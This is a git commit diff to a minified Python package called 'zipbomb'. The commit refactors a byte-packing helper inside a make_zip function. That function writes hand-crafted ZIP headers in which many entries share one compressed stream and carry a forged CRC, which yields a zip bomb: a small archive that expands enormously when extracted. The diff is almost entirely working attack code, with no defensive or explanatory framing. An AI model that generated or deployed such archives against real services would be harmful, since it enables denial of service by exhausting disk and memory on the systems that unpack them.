9f91d2e43e9eb85d9b75682c753885ae0dc70938
donno2048 <just4now666666@gmail.com>
2022-10-02 00:19:20 +0300

    remove L

--- zipbomb/__init__.py
+++ zipbomb/__init__.py
@@ -1,7 +1,6 @@
 # warning: minified
 from functools import reduce as C
-L=lambda a,b:bytes.fromhex(a%b)[::-1]
-A=lambda i:L('%.8x',i)
+A=lambda i:bytes.fromhex('%.8x'%i)[::-1]
 I=lambda m,v:C(lambda i,j:i^j,[B*(v>>A&1)for(A,B)in enumerate(m)])
 B=lambda i:b'\0'*i
 def make_zip(f,num_files,compressed_size):
@@ -12,6 +11,6 @@ def make_zip(f,num_files,compressed_size):
 	while G:
 		if G&1:D=[I(D,A)for A in H]
 		H=[I(H,A)for A in H];G>>=1
-	P=~ I(D,M)&M;K=f.write(b'PK\3\4\x14\0\0\0\x08'+B(5)+A(P)+A(C)+A(O)+b'\1\0\0\0\0\xed\xc0\x81\x08\0\0\0\xc0\xb0\xfbS_d\x0b'+B(C-15)+b'`');Q=K
-	for T in range(J):R=str(T).encode();K+=f.write(b'PK\1\2\x14\0\x14\0\0\0\x08'+B(5)+A(P)+A(C)+A(O)+L('%.4x',len(R))+B(16)+R)
+	P=~I(D,M)&M;K=f.write(b'PK\3\4\x14\0\0\0\x08'+B(5)+A(P)+A(C)+A(O)+b'\1\0\0\0\0\xed\xc0\x81\x08\0\0\0\xc0\xb0\xfbS_d\x0b'+B(C-15)+b'`');Q=K
+	for T in range(J):R=str(T).encode();K+=f.write(b'PK\1\2\x14\0\x14\0\0\0\x08'+B(5)+A(P)+A(C)+A(O)+A(len(R))[:2]+B(16)+R)
 	f.write(b'PK\5\6'+B(4)+A(J+(J<<16))+A(K-Q)+A(Q)+B(2))
